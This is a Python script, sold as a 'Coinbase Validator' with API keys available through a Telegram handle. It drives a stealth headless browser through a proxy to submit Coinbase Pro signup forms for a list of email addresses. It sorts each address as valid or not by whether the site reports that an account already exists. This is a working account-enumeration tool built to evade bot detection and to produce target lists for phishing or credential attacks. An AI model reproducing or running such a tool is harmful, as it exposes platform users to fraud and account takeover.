from time import sleep
import requests, os
import concurrent.futures
from colorama import Fore
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException
from selenium_stealth import stealth
import chromedriver_binary

try:
  os.mkdir('result')
except:
  pass

cb = '''      
         ) (       )              (        
   (  ( /( )\ ) ( /(   (    (     )\ )     
   )\ )\()|()/( )\())( )\   )\   (()/((    
 (((_|(_)\ /(_)|(_)\ )((_|(((_)(  /(_))\   
 )\___ ((_|_))  _((_|(_)_ )\ _ )\(_))((_)  
((/ __/ _ \_ _|| \| || _ )(_)_\(_) __| __| 
 | (_| (_) | | | .` || _ \ / _ \ \__ \ _|  
  \___\___/___||_|\_||___//_/ \_\|___/___| 
                                          
                VALIDATOR CLI                    
'''


print(f'{Fore.LIGHTYELLOW_EX}{cb}{Fore.RESET}\n===========================================\n')
print(f'{Fore.LIGHTRED_EX}Format Proxy = {Fore.LIGHTWHITE_EX}ip:port')
prox = input("Input Your Proxy: ")
pr = open('.proxies', 'w')
pr.write(prox)
pr.close
try:
  emailist = []

  mailist = open(input("Input Your List: "))
  lime = mailist.read().splitlines()
  tot = len(lime)
  for line in lime:
    emailist.append(line)
except:
  print("Wrong input or list not found!")
  exit()


def login(emails):
    opt = webdriver.ChromeOptions()
    proxt = open('.proxies', 'r').read()
    opt.add_experimental_option("excludeSwitches", ["enable-automation"])
    opt.add_experimental_option('useAutomationExtension', False)
    opt.add_argument('--proxy-server=%s' % proxt)
    opt.add_argument('--headless')
    opt.add_argument('--disable-gpu')
    opt.add_argument('--disable-dev-shm-usage')
    opt.add_argument("--disable-cookie-encryption")
    opt.add_argument("--disable-blink-features=AutomationControlled")
    opt.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36")    
    driver = webdriver.Chrome(options=opt)
    stealth(driver,
        languages=["en-US", "en"],
        vendor="Google Inc.",
        platform="Win32",
        webgl_vendor="Intel Inc.",
        renderer="Intel Iris OpenGL Engine",
        fix_hairline=True,
    )
    try:
      loads = requests.get('https://raw.githubusercontent.com/immkune/ocr/main/api.txt').text
      api = open('.conf', 'r').read()
      if api in loads:
          try:
              driver.implicitly_wait(10)
              driver.get('https://pro.coinbase.com/signup/idv_required')
              driver.find_element(By.ID, "user_first_name").send_keys("Jhon")
              driver.find_element(By.ID, "user_last_name").send_keys("Kennedy")
              driver.find_element(By.ID, "user_email").click()
              driver.find_element(By.ID, "user_email").send_keys(emails)
              driver.find_element(By.ID, "user_accepted_user_agreement").click()   
              driver.find_element(By.ID, "user_password").send_keys("KTyBvwhd783&@#")
              driver.find_element(By.NAME, "commit").click()
              try:
                  element = driver.find_element(By.CSS_SELECTOR, ".alert")
                  text = element.get_attribute('innerHTML')
                  html = BeautifulSoup(text, 'html.parser')
                  ready = html.get_text()
                  if "An account already exists with this email address." in ready:
                      print(f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {emails} {Fore.LIGHTWHITE_EX}={Fore.LIGHTCYAN_EX} Valid')
                      tx = open('result/valid.txt', 'a+')
                      tx.write('\n')
                      tx.writelines(emails)
                      tx.close()  
                      driver.quit()
              except:
                  print(f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {emails} {Fore.LIGHTWHITE_EX}={Fore.LIGHTRED_EX} Die')
                  tx = open('result/die.txt', 'a+')
                  tx.write('\n')
                  tx.writelines(emails)
                  tx.close()  
                  driver.quit()
          except:
              print(f'{Fore.LIGHTWHITE_EX}[#]{Fore.LIGHTGREEN_EX} {emails} {Fore.LIGHTWHITE_EX}={Fore.LIGHTYELLOW_EX} Bad Proxy')
              tx = open('result/proxy.txt', 'a+')
              tx.write('\n')
              tx.writelines(emails)
              tx.close()
              driver.quit()
      else:
        print(f'{Fore.LIGHTWHITE_EX}\n[+]{Fore.LIGHTRED_EX} Your Apikey Has Expired{Fore.LIGHTWHITE_EX} [+]')
        print(f'{Fore.LIGHTWHITE_EX}[+]{Fore.LIGHTGREEN_EX} Get premium Apikey to')
        print(f'{Fore.LIGHTWHITE_EX}[+]{Fore.LIGHTGREEN_EX} Telegram {Fore.LIGHTBLUE_EX}@hunterz_dice{Fore.LIGHTWHITE_EX} [+]')
        exit()
    except KeyboardInterrupt:
      exit()


def main():
  try:
    apikey = requests.get('https://raw.githubusercontent.com/immkune/ocr/main/api.txt').text
    work = int(input("Set Your Thread: "))
    appikey = input('Input Your Apikey: ')
    print(f'{Fore.LIGHTWHITE_EX}>{Fore.LIGHTGREEN_EX} Total your List = {Fore.LIGHTWHITE_EX}{tot}{Fore.RESET}')
    print(f'{Fore.LIGHTWHITE_EX}>{Fore.LIGHTGREEN_EX} Total your Thread = {Fore.LIGHTWHITE_EX}{work}{Fore.RESET}')
    print(f'{Fore.LIGHTWHITE_EX}>{Fore.LIGHTYELLOW_EX} Wait a second......\n')
    appikey = input('Input Your Apikey: ')
    if appikey in apikey:
        aps = open('.conf', 'w')
        aps.write(appikey)
        aps.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=work) as executor:
            executor.map(login, emailist)
    else:
        print(f'{Fore.LIGHTWHITE_EX}\n[+]{Fore.LIGHTRED_EX} Your Apikey Has Expired{Fore.LIGHTWHITE_EX} [+]')
        print(f'{Fore.LIGHTWHITE_EX}[+]{Fore.LIGHTGREEN_EX} Get premium Apikey to')
        print(f'{Fore.LIGHTWHITE_EX}[+]{Fore.LIGHTGREEN_EX} Telegram {Fore.LIGHTBLUE_EX}@hunterz_dice{Fore.LIGHTWHITE_EX} [+]')
  except:
    exit()


if __name__ == '__main__':
    main()
